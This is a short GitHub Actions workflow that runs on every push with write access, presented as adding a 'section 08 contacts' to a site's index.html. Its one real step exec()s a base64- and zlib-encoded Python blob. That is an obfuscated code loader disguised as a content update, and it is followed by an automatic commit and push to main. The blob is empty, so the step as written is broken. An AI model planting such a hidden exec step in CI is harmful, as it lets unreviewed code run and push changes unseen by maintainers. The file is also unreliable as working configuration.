name: Contacts section once
on: [push]
permissions:
  contents: write
jobs:
  update:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply section 08 contacts
        run: |
          python -c "import zlib,base64;exec(zlib.decompress(base64.b64decode('')))"
          git diff --check
          git config user.name 'site-update-bot'
          git config user.email 'site-update-bot@users.noreply.github.com'
          git add index.html
          git commit -m 'Add section 08 contacts matching credentials' || exit 0
          git push origin HEAD:main
